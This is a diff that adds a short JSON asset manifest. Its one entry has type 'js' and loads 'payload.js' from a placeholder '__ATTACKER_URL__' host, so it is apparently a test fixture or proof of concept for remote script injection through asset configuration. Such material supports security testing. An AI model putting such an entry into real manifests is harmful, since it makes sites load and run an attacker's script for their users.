@@ -1,0 +1,6 @@
+[
+  {
+    "assetType": "js",
+    "path": "__ATTACKER_URL__/payload.js"
+  }
+]
